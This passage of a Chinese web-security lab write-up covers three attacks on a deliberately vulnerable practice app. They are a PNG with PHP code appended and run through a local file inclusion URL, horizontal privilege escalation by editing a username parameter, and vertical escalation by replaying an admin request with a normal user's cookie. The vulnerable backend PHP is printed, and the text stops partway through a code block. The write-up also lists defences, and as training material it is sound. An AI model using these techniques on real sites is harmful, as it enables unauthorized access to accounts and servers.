<pre tabindex="0"><code>F210h: 3D 61 00 00 00 00 49 45 4E 44 AE 42 60 82 3C 3F  =a....IEND®B`‚&lt;? 
F220h: 70 68 70 0A 2F 2A 2A 0A 20 2A 20 43 72 65 61 74  php./**. * Creat 
F230h: 65 64 20 62 79 20 72 75 6E 6E 65 72 2E 68 61 6E  ed by runner.han 
F240h: 0A 20 2A 20 54 68 65 72 65 20 69 73 20 6E 6F 74  . * There is not 
F250h: 68 69 6E 67 20 6E 65 77 20 75 6E 64 65 72 20 74  hing new under t 
F260h: 68 65 20 73 75 6E 0A 20 2A 2F 0A 0A 70 68 70 69  he sun. */..phpi 
F270h: 6E 66 6F 28 29 3B 0A 0A 0A 3F 3E 00 00 00 00 00  nfo();...?&gt;
</code></pre><p>得到一张可以正常显示的图片，但是文件尾后多了之前的一句话木马</p>
<p>上传，URL访问</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/unsafeupload/uploads/phpinfo.png
</code></pre><p><img alt="img" src="./img/2022092-1-1.png"></p>
<p>当然，此时代码还未被执行</p>
<p>还记得之前文件包含漏洞的本地文件包含吗，我们来利用这个漏洞</p>
<p><code>include()</code>函数处理目标文件时会无视错误代码直至遇到正确的代码，我们可以利用这种特性让它来执行图片木马</p>
<p>我们来拼接一下文件包含漏洞的URL，其中<code>../</code>的数量需要一个个尝试，实际场景中我们可能需要爆破路径</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/phpinfo.png&amp;submit=提交查询
</code></pre><p><img alt="img" src="./img/2022092-2-1.png"></p>
<p><img alt="img" src="./img/2022092-3-1.png"></p>
<p>翻到下面可以看到<code>phpinfo()</code>已经被执行</p>
<h3 id="防范措施-1">防范措施</h3>
<ul>
<li>不在前端使用JavaScript实施上传限制策略</li>
<li>通过服务端对上传文件进行限制
<ul>
<li>进行多条件组合检查，如文件大小、路径、扩展名、文件类型、文件完整性</li>
<li>对上传的文件在服务器上存储时根据合理的命名规则进行重命名</li>
<li>对服务端上传文件的目录进行权限控制（比如只读），限制执行权限带来的危害</li>
</ul>
</li>
</ul>
<h2 id="over-permission">Over Permission</h2>
<h3 id="概述-8">概述</h3>
<p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作</p>
<ul>
<li>水平越权
<ul>
<li>用户A和用户B属于同级用户，但不能操作彼此的信息</li>
<li>用户A若越权操作用户B的信息则成为水平越权</li>
</ul>
</li>
<li>垂直越权
<ul>
<li>用户A权限低于用户B</li>
<li>用户A若越权操作用户B的信息则被称为垂直越权</li>
</ul>
</li>
</ul>
<p>越权漏洞形成的原因是后台使用了不合理的权限校验规则。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞</p>
<p>由于每个应用系统的用户对应的权限是根据业务功能划分的，具有多样性，因此越权漏洞很难通过工具扫描出来，需要手动测试</p>
<p>因此，开发人员和后台管理在权限管理中应该遵守</p>
<ul>
<li>使用最小权限原则对用户进行赋权</li>
<li>使用合理（严格）的权限校验规则</li>
<li>使用后台登录态作为条件进行权限判断</li>
</ul>
<h3 id="水平越权">水平越权</h3>
<p>首先登录一下，查询个人信息</p>
<p><img alt="img" src="./img/2022090-0-4.png"></p>
<p>检查一下地址栏，发现刚刚的提交按钮只做了一个GET请求</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
</code></pre><p>我们修改一下URL试试</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
</code></pre><p><img alt="img" src="./img/2022090-1-3.png"></p>
<p>这样就越权成功了</p>
<p>后端源码片段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;op1_login.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/mysql.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/function.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;inc/config.inc.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 判断是否登录，没有登录不能访问
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_op_login</span><span class="p">(</span><span class="nv">$link</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op1_login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$username</span><span class="o">=</span><span class="nx">escape</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from member where username=&#39;</span><span class="si">$username</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="o">=</span><span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$uname</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sex</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;sex&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$phonenum</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phonenum&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$add</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;address&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$email</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=&lt;&lt;&lt;</span><span class="nx">A</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;per_info&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">h1</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_title&#34;</span><span class="o">&gt;</span><span class="nx">hello</span><span class="p">,{</span><span class="nv">$uname</span><span class="p">},</span><span class="nx">你的具体信息如下：</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_name&#34;</span><span class="o">&gt;</span><span class="nx">姓名</span><span class="o">:</span><span class="p">{</span><span class="nv">$uname</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_sex&#34;</span><span class="o">&gt;</span><span class="nx">性别</span><span class="o">:</span><span class="p">{</span><span class="nv">$sex</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_phone&#34;</span><span class="o">&gt;</span><span class="nx">手机</span><span class="o">:</span><span class="p">{</span><span class="nv">$phonenum</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>    
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_add&#34;</span><span class="o">&gt;</span><span class="nx">住址</span><span class="o">:</span><span class="p">{</span><span class="nv">$add</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span> 
</span></span><span class="line"><span class="cl">   <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;per_email&#34;</span><span class="o">&gt;</span><span class="nx">邮箱</span><span class="o">:</span><span class="p">{</span><span class="nv">$email</span><span class="p">}</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span> 
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;logout&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;logout&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_unset</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_destroy</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="nx">session_name</span><span class="p">(),</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nx">time</span><span class="p">()</span><span class="o">-</span><span class="mi">3600</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;location:op1_login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="垂直越权">垂直越权</h3>
<p>同样是先登录</p>
<p><img alt="img" src="./img/2022091-0-3-1024x316.png"></p>
<p><img alt="img" src="./img/2022091-1-3-1024x251.png"></p>
<p>我们发现普通用户只有查看列表的权限而管理员有增删用户的权限（左管理右普通）</p>
<p>我们先通过管理员用户增加一个用户a</p>
<p><img alt="img" src="./img/2022091-2-2-1024x41.png"></p>
<p>然后退出登录</p>
<p>BurpSuite抓个包，Repeat一下</p>
<p><img alt="img" src="./img/2022091-4-2.png"></p>
<p><img alt="img" src="./img/2022091-3-2-1024x376.png"></p>
<p>发现后台并没有增加用户，页面也被重定向至登录页面要求登录了</p>
<p>这是因为我们刚刚退出了管理员账号的登录状态</p>
<p>我们登录普通用户抓个包，复制登录态的Cookie到管理员的数据包中再来提交试试</p>
<p><img alt="img" src="./img/2022091-5-1.png"></p>
<p><img alt="img" src="./img/2022091-6-1-1024x69.png"></p>
<p>这样就越权成功了</p>
<p>看看后端源码</p>
<p>首先是登录页面</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;op1_login.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span 